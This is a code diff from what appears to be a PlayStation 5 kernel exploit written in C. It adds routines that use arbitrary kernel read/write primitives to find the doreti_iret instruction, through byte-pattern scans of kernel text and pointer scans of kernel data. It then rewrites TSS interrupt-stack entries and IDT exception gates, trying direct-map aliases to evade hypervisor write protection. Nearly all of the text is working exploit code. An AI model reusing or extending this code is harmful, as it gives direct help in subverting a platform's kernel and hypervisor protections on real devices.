@@ -4235,6 +4235,7 @@ broad_done:
         void *sigalt_stack = NULL;
         uint64_t tss_va = 0;
         int tss_stride = 0;
+        uint64_t gp_handler_va = 0;  /* #GP handler address from IDT */
         #define GP_TRAP_MAX_CPUS 16
         int ist_modified_percpu[GP_TRAP_MAX_CPUS][7];
         uint64_t ist_saved_percpu[GP_TRAP_MAX_CPUS][7];
@@ -4651,7 +4652,7 @@ broad_done:
             }
 
             gp_ist_index = gp_gate[4] & 0x07;
-            uint64_t gp_handler =
+            gp_handler_va =
                 (uint64_t)gp_gate[0] |
                 ((uint64_t)gp_gate[1] << 8) |
                 ((uint64_t)gp_gate[6] << 16) |
@@ -4663,7 +4664,367 @@ broad_done:
 
             send_response(sock, "  #GP gate: handler=0x%lx IST=%d "
                           "type=0x%02x\n",
-                          gp_handler, gp_ist_index, gp_gate[5]);
+                          gp_handler_va, gp_ist_index, gp_gate[5]);
+        }
+
+        /* ---- Strategy A: Try reading kernel text near #GP handler via DMAP ----
+         *
+         * FreeBSD's exception.S places doreti_iret in the same translation
+         * unit as the trap handler stubs.  If the HV allows DMAP reads of
+         * the physical pages containing the handler, we can directly scan
+         * for iretq (0x48 0xcf) without any kernel writes — completely
+         * avoiding the TSS/IDT modification that causes kernel panics.
+         */
+        if (gp_handler_va != 0 && have_text_pa) {
+            send_response(sock, "\n7b+. Strategy A: scanning text near "
+                          "#GP handler 0x%lx...\n", gp_handler_va);
+
+            /* Translate handler VA to physical address */
+            uint64_t gp_handler_off = (uint64_t)gp_handler_va -
+                                      (uint64_t)ktext_base;
+            uint64_t gp_pa = text_pa + gp_handler_off;
+
+            /* Safe test: try reading 1 byte via DMAP */
+            uint8_t test_byte;
+            int test_rc = kernel_copyout(dmap_base + gp_pa, &test_byte, 1);
+            send_response(sock, "  handler PA=0x%lx, DMAP read test: rc=%d\n",
+                          gp_pa, test_rc);
+
+            if (test_rc == 0) {
+                /* DMAP reads of .text work! Scan +-8KB around handler */
+                send_response(sock, "  DMAP readable! Scanning +-8KB "
+                              "for iretq...\n");
+
+                uint64_t scan_start_pa = (gp_pa > 0x2000) ?
+                                          (gp_pa - 0x2000) & ~0xFFFULL : 0;
+                uint64_t scan_end_pa = (gp_pa + 0x2000 + 0xFFF) & ~0xFFFULL;
+                uint8_t scan_buf[4096];
+
+                uint64_t best_iretq_va = 0;
+                int best_confidence = 0;
+                int iretq_count = 0;
+
+                for (uint64_t pa = scan_start_pa;
+                     pa < scan_end_pa; pa += 0x1000) {
+                    if (kernel_copyout(dmap_base + pa, scan_buf,
+                                       sizeof(scan_buf)) != 0) {
+                        send_response(sock, "  page PA=0x%lx: "
+                                      "unreadable\n", pa);
+                        continue;
+                    }
+
+                    for (size_t i = 0; i + 1 < sizeof(scan_buf); i++) {
+                        if (scan_buf[i] != 0x48 || scan_buf[i+1] != 0xcf)
+                            continue;
+
+                        uint64_t cand_pa = pa + i;
+                        uint64_t cand_va = (uint64_t)ktext_base +
+                                           (cand_pa - text_pa);
+                        int confidence = 0;
+                        iretq_count++;
+
+                        /* cli (0xfa) within 40 bytes before */
+                        size_t cli_start = (i >= 40) ? i - 40 : 0;
+                        int has_cli = 0;
+                        for (size_t j = cli_start; j < i; j++) {
+                            if (scan_buf[j] == 0xfa) {
+                                has_cli = 1;
+                                confidence += 2;
+                                break;
+                            }
+                        }
+
+                        /* swapgs (0x0f 0x01 0xf8) within 32 bytes before */
+                        size_t sg_start = (i >= 32) ? i - 32 : 0;
+                        int has_swapgs = 0;
+                        for (size_t j = sg_start; j + 2 < i; j++) {
+                            if (scan_buf[j] == 0x0f &&
+                                scan_buf[j+1] == 0x01 &&
+                                scan_buf[j+2] == 0xf8) {
+                                has_swapgs = 1;
+                                confidence += 3;
+                                break;
+                            }
+                        }
+
+                        /* subq $imm,%rsp after iretq (doreti_iret_fault) */
+                        int has_subq = 0;
+                        if (i + 2 + 16 <= sizeof(scan_buf)) {
+                            for (size_t j = i + 2;
+                                 j < i + 2 + 16 && j + 2 < sizeof(scan_buf);
+                                 j++) {
+                                if (scan_buf[j] == 0x48 &&
+                                    (scan_buf[j+1] == 0x83 ||
+                                     scan_buf[j+1] == 0x81) &&
+                                    scan_buf[j+2] == 0xec) {
+                                    has_subq = 1;
+                                    confidence += 3;
+                                    break;
+                                }
+                            }
+                        }
+
+                        /* proximity: within 1 page before handler is best */
+                        int64_t dist = (int64_t)(cand_pa - gp_pa);
+                        if (dist < 0 && dist > -0x1000)
+                            confidence += 2;
+                        else if (dist >= 0 && dist < 0x1000)
+                            confidence += 1;
+
+                        send_response(sock,
+                            "  iretq at VA=0x%lx (ktext+0x%lx, "
+                            "dist=%+ld) cli=%d swapgs=%d subq=%d "
+                            "conf=%d\n",
+                            cand_va,
+                            (unsigned long)(cand_va - (uint64_t)ktext_base),
+                            (long)dist, has_cli, has_swapgs, has_subq,
+                            confidence);
+
+                        if (confidence > best_confidence) {
+                            best_confidence = confidence;
+                            best_iretq_va = cand_va;
+                        }
+                    }
+                }
+
+                send_response(sock, "  Found %d iretq instructions in "
+                              "+-8KB\n", iretq_count);
+
+                if (best_iretq_va != 0 && best_confidence >= 3) {
+                    uint64_t koff = best_iretq_va - (uint64_t)ktext_base;
+                    send_response(sock,
+                        "\n*** doreti_iret = 0x%lx (ktext+0x%lx) ***\n",
+                        best_iretq_va, koff);
+                    send_response(sock,
+                        "Confidence: %s (text scan near #GP handler, "
+                        "score=%d)\n",
+                        best_confidence >= 5 ? "HIGH" : "MEDIUM",
+                        best_confidence);
+                    send_response(sock,
+                        "  Found via Strategy A — zero kernel writes\n");
+
+                    /* Add to candidates array for Step 8 classification */
+                    if (num_candidates < MAX_DORETI_CANDIDATES) {
+                        candidates[num_candidates].paddr =
+                            best_iretq_va - (uint64_t)ktext_base + text_pa;
+                        candidates[num_candidates].ktext_offset = koff;
+                        candidates[num_candidates].has_swapgs_before =
+                            (best_confidence >= 5) ? 1 : 0;
+                        candidates[num_candidates].near_handler = 13;
+                        candidates[num_candidates].page_dist = 0;
+                        num_candidates++;
+                    }
+                    goto classify;
+                }
+
+                if (best_iretq_va != 0) {
+                    send_response(sock,
+                        "  Best iretq at 0x%lx (score=%d) — too low, "
+                        "continuing...\n",
+                        best_iretq_va, best_confidence);
+                }
+            } else {
+                send_response(sock, "  .text is XOM via DMAP — "
+                              "Strategy A cannot read code\n");
+            }
+        }
+
+        /* ---- Strategy B: Scan .data for pointers near #GP handler ----
+         *
+         * Even if .text is XOM, kernel .data is readable.  FreeBSD's
+         * trap.c references doreti_iret in comparisons, and exception
+         * table entries may store the address.  Scan 64MB of .data for
+         * 8-byte pointers within +-16KB of the #GP handler VA.
+         *
+         * Key signal: if we find pointers at both V and V+2, that's
+         * doreti_iret and doreti_iret_fault (iretq is 2 bytes).
+         */
+        if (gp_handler_va != 0) {
+            send_response(sock, "\n7b+. Strategy B: scanning .data for "
+                          "pointers near handler...\n");
+
+            uint64_t data_start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+            uint64_t data_scan_size = 0x4000000; /* 64MB */
+            uint64_t handler_low  = gp_handler_va - 0x4000;  /* -16KB */
+            uint64_t handler_high = gp_handler_va + 0x4000;  /* +16KB */
+            uint8_t dbuf[4096];
+
+            #define MAX_NEAR_PTRS 64
+            struct near_ptr_entry {
+                uint64_t text_va;     /* pointer value (target in .text) */
+                uint64_t data_addr;   /* where found in .data */
+                int64_t  dist;        /* distance from gp_handler */
+            } near_ptrs[MAX_NEAR_PTRS];
+            int num_near_ptrs = 0;
+
+            for (uint64_t addr = data_start;
+                 addr < data_start + data_scan_size;
+                 addr += sizeof(dbuf)) {
+
+                if (((addr - data_start) & 0x7FFFFF) == 0 &&
+                    addr != data_start)
+                    send_response(sock, "  ...%luMB\n",
+                        (unsigned long)((addr - data_start) >> 20));
+
+                if (kernel_copyout(addr, dbuf, sizeof(dbuf)) != 0)
+                    continue;
+
+                for (int off = 0; off <= (int)sizeof(dbuf) - 8; off += 8) {
+                    uint64_t val;
+                    memcpy(&val, dbuf + off, 8);
+
+                    if (val < handler_low || val > handler_high)
+                        continue;
+                    if (val & 0x1)  /* odd addresses unlikely for x86 */
+                        continue;
+
+                    /* Deduplicate */
+                    int dup = 0;
+                    for (int i = 0; i < num_near_ptrs; i++) {
+                        if (near_ptrs[i].text_va == val) {
+                            dup = 1;
+                            break;
+                        }
+                    }
+                    if (dup) continue;
+
+                    if (num_near_ptrs < MAX_NEAR_PTRS) {
+                        near_ptrs[num_near_ptrs].text_va = val;
+                        near_ptrs[num_near_ptrs].data_addr = addr + off;
+                        near_ptrs[num_near_ptrs].dist =
+                            (int64_t)(val - gp_handler_va);
+                        num_near_ptrs++;
+                    }
+                }
+            }
+
+            send_response(sock, "  Found %d unique .text pointers "
+                          "near handler\n", num_near_ptrs);
+
+            if (num_near_ptrs > 0) {
+                /* Sort by absolute distance from handler */
+                for (int i = 0; i < num_near_ptrs - 1; i++) {
+                    int best = i;
+                    int64_t best_d = near_ptrs[i].dist < 0 ?
+                                     -near_ptrs[i].dist :
+                                     near_ptrs[i].dist;
+                    for (int j = i + 1; j < num_near_ptrs; j++) {
+                        int64_t d = near_ptrs[j].dist < 0 ?
+                                    -near_ptrs[j].dist :
+                                    near_ptrs[j].dist;
+                        if (d < best_d) {
+                            best = j;
+                            best_d = d;
+                        }
+                    }
+                    if (best != i) {
+                        struct near_ptr_entry tmp = near_ptrs[i];
+                        near_ptrs[i] = near_ptrs[best];
+                        near_ptrs[best] = tmp;
+                    }
+                }
+
+                /* Try to verify each via DMAP read */
+                uint64_t best_doreti = 0;
+                int best_score = 0;
+
+                for (int i = 0; i < num_near_ptrs && i < 32; i++) {
+                    uint64_t va = near_ptrs[i].text_va;
+                    int64_t dist = near_ptrs[i].dist;
+                    uint64_t koff = va - (uint64_t)ktext_base;
+
+                    send_response(sock, "  ptr: 0x%lx (ktext+0x%lx, "
+                                  "dist=%+ld) @ kdata+0x%lx",
+                                  va, koff, (long)dist,
+                                  near_ptrs[i].data_addr - data_start);
+
+                    /* Try DMAP read at the pointer target */
+                    if (have_text_pa) {
+                        uint64_t target_pa = text_pa + koff;
+                        uint8_t code[8];
+                        if (kernel_copyout(dmap_base + target_pa,
+                                           code, sizeof(code)) == 0) {
+                            if (code[0] == 0x48 && code[1] == 0xcf) {
+                                int score = 1;
+                                send_response(sock, " -> IRETQ!");
+                                /* Check for V+2 pair (doreti_iret_fault) */
+                                for (int j = 0; j < num_near_ptrs; j++) {
+                                    if (near_ptrs[j].text_va == va + 2) {
+                                        score += 5;
+                                        send_response(sock,
+                                            " PAIR at +2 "
+                                            "(doreti_iret_fault)!");
+                                        break;
+                                    }
+                                }
+                                if (dist < 0)
+                                    score += 1; /* before handler = expected */
+                                send_response(sock, " score=%d\n", score);
+                                if (score > best_score) {
+                                    best_score = score;
+                                    best_doreti = va;
+                                }
+                            } else {
+                                send_response(sock, " -> %02x %02x "
+                                              "(not iretq)\n",
+                                              code[0], code[1]);
+                            }
+                        } else {
+                            send_response(sock, " -> DMAP unreadable\n");
+                        }
+                    } else {
+                        send_response(sock, " -> no text PA\n");
+                    }
+                }
+
+                if (best_doreti != 0) {
+                    uint64_t koff = best_doreti - (uint64_t)ktext_base;
+                    send_response(sock,
+                        "\n*** doreti_iret = 0x%lx (ktext+0x%lx) ***\n",
+                        best_doreti, koff);
+                    send_response(sock,
+                        "Confidence: %s (.data pointer scan, "
+                        "score=%d)\n",
+                        best_score >= 5 ? "HIGH" : "MEDIUM",
+                        best_score);
+                    send_response(sock,
+                        "  Found via Strategy B — zero kernel writes\n");
+
+                    if (num_candidates < MAX_DORETI_CANDIDATES) {
+                        candidates[num_candidates].paddr =
+                            best_doreti - (uint64_t)ktext_base + text_pa;
+                        candidates[num_candidates].ktext_offset = koff;
+                        candidates[num_candidates].has_swapgs_before =
+                            (best_score >= 5) ? 1 : 0;
+                        candidates[num_candidates].near_handler = 13;
+                        candidates[num_candidates].page_dist = 0;
+                        num_candidates++;
+                    }
+                    goto classify;
+                }
+
+                /* Even if DMAP verify failed, report unverified pointers */
+                if (num_near_ptrs > 0) {
+                    send_response(sock,
+                        "  %d pointers found but none verified as "
+                        "iretq — adding as unverified candidates\n",
+                        num_near_ptrs);
+                    for (int i = 0; i < num_near_ptrs &&
+                         num_candidates < MAX_DORETI_CANDIDATES &&
+                         i < 8; i++) {
+                        uint64_t va = near_ptrs[i].text_va;
+                        uint64_t koff = va - (uint64_t)ktext_base;
+                        candidates[num_candidates].paddr =
+                            have_text_pa ? text_pa + koff : 0;
+                        candidates[num_candidates].ktext_offset = koff;
+                        candidates[num_candidates].has_swapgs_before = 0;
+                        candidates[num_candidates].near_handler = 13;
+                        candidates[num_candidates].page_dist = 1;
+                        num_candidates++;
+                    }
+                }
+            }
+            #undef MAX_NEAR_PTRS
         }
 
         /* 7c. Allocate IST page */
@@ -5084,6 +5445,8 @@ broad_done:
          * signal arrives during kernel_setlong/kernel_setchar, the
          * handler longjmps back here instead of calling _exit.
          * The cleanup path will restore any partially-written TSS/IDT. */
+        send_response(sock, "  [DIAG] checkpoint 1: before sigsetjmp\n");
+        usleep(5000);
         gp_trap_jmp_valid = 1;
         if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
             /* Signal received during TSS/IDT patching */
@@ -5093,44 +5456,136 @@ broad_done:
             gp_trap_jmp_valid = 0;
             goto step7_cleanup;
         }
+        send_response(sock, "  [DIAG] checkpoint 2: after sigsetjmp\n");
+        usleep(5000);
 
         /* Step 1: Set TSS IST entries on validated CPUs FIRST — before
          * touching the IDT.
          *
-         * Use kernel_setchar (byte-by-byte) instead of kernel_setlong.
-         * kernel_setlong consistently panics the kernel on PS5, possibly
-         * due to the HV trapping 8-byte writes to the TSS or the exploit
-         * primitive's 8-byte write path having side effects after 100k+
-         * prior calls during the DMAP scan.  kernel_setchar uses a
-         * different code path that may avoid the issue. */
+         * Strategy C: Try DMAP-based write first.  The HV may block
+         * writes to the kernel .data VA but allow writes through the
+         * DMAP alias (different PTE path in SLAT/EPT).
+         * Falls back to direct VA write if DMAP translation fails.
+         *
+         * Uses kernel_setchar (byte-by-byte) either way. */
         send_response(sock, "\n  Applying TSS patches (%d validated CPUs)...\n",
                       num_cpus_found);
+        usleep(5000);
         {
             int idx = gp_ist_index - 1;
+
+            /* Try translating TSS VA to PA for DMAP-based write */
+            uint64_t tss_pa = 0;
+            int use_dmap = 0;
+            if (have_text_pa) {
+                /* TSS is in kdata; compute PA via kdata offset */
+                uint64_t kdata_base_local = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+                uint64_t tss_off_from_kdata = tss_va - kdata_base_local;
+                uint64_t kdata_pa = 0;
+                if (vaddr_to_paddr_quiet(dmap_base, pm_cr3,
+                                         kdata_base_local,
+                                         &kdata_pa, NULL) == 0) {
+                    tss_pa = kdata_pa + tss_off_from_kdata;
+                    use_dmap = 1;
+                    send_response(sock,
+                        "  [DIAG] TSS PA=0x%lx (DMAP alias=0x%lx)\n",
+                        tss_pa, dmap_base + tss_pa);
+                } else {
+                    send_response(sock,
+                        "  [DIAG] Cannot xlat kdata, using direct VA\n");
+                }
+            }
+
             for (int cpu = 0; cpu < num_cpus_found; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                uint64_t ist_off = cpu_tss + 0x24 + idx * 8;
+                uint64_t ist_off_va = cpu_tss + 0x24 + idx * 8;
+                uint64_t write_addr;
+                const char *method;
+
+                if (use_dmap) {
+                    uint64_t cpu_tss_pa = tss_pa +
+                                          (uint64_t)cpu * tss_stride;
+                    write_addr = dmap_base + cpu_tss_pa + 0x24 + idx * 8;
+                    method = "DMAP";
+                } else {
+                    write_addr = ist_off_va;
+                    method = "direct";
+                }
+
+                send_response(sock,
+                    "  [DIAG] CPU%d: writing IST%d at 0x%lx (%s)...\n",
+                    cpu, gp_ist_index, write_addr, method);
+                usleep(5000);
+
                 /* Write IST value byte-by-byte */
                 uint64_t val = ist_stack_top;
+                int write_ok = 1;
                 for (int b = 0; b < 8; b++) {
-                    kernel_setchar(ist_off + b,
-                                   (uint8_t)(val >> (b * 8)));
+                    int rc = kernel_setchar(write_addr + b,
+                                            (uint8_t)(val >> (b * 8)));
+                    if (rc != 0) {
+                        send_response(sock,
+                            "  CPU%d byte %d FAILED (rc=%d)\n",
+                            cpu, b, rc);
+                        write_ok = 0;
+                        break;
+                    }
                 }
-                ist_modified_percpu[cpu][idx] = 1;
-                send_response(sock, "  CPU%d IST%d -> 0x%lx (at 0x%lx)\n",
-                              cpu, gp_ist_index, ist_stack_top, ist_off);
+
+                if (!write_ok && use_dmap) {
+                    /* DMAP write failed — retry via direct VA */
+                    send_response(sock,
+                        "  [DIAG] DMAP failed, retrying via direct VA "
+                        "at 0x%lx...\n", ist_off_va);
+                    usleep(5000);
+                    write_ok = 1;
+                    for (int b = 0; b < 8; b++) {
+                        int rc = kernel_setchar(ist_off_va + b,
+                                                (uint8_t)(val >> (b * 8)));
+                        if (rc != 0) {
+                            send_response(sock,
+                                "  CPU%d byte %d FAILED (rc=%d)\n",
+                                cpu, b, rc);
+                            write_ok = 0;
+                            break;
+                        }
+                    }
+                }
+
+                if (write_ok) {
+                    ist_modified_percpu[cpu][idx] = 1;
+                    send_response(sock,
+                        "  CPU%d IST%d -> 0x%lx (at 0x%lx, %s)\n",
+                        cpu, gp_ist_index, ist_stack_top,
+                        write_addr, method);
+                } else {
+                    send_response(sock,
+                        "  CPU%d: write failed — aborting\n", cpu);
+                    goto step7_cleanup;
+                }
             }
         }
+        send_response(sock, "  [DIAG] checkpoint 3: TSS writes done\n");
+        usleep(5000);
+
         /* Step 2: NOW patch the IDT gates — all CPUs have valid IST7 */
         send_response(sock, "  Patching IDT gates...\n");
         if (gp_needs_patch) {
             uint8_t new_byte = (idt_gate_saved[4] & 0xF8) | 7;
+            send_response(sock,
+                "  [DIAG] Writing #GP gate at 0x%lx...\n",
+                idt_access + 13 * 16 + 4);
+            usleep(5000);
             kernel_setchar(idt_access + 13 * 16 + 4, new_byte);
             idt_gate_modified = 1;
             send_response(sock, "  #GP gate IST -> 7\n");
         }
         if (ss_needs_patch) {
             uint8_t new_byte = (ss_gate_saved[4] & 0xF8) | 7;
+            send_response(sock,
+                "  [DIAG] Writing #SS gate at 0x%lx...\n",
+                idt_access + 12 * 16 + 4);
+            usleep(5000);
             kernel_setchar(idt_access + 12 * 16 + 4, new_byte);
             ss_gate_modified = 1;
             send_response(sock, "  #SS gate IST -> 7\n");
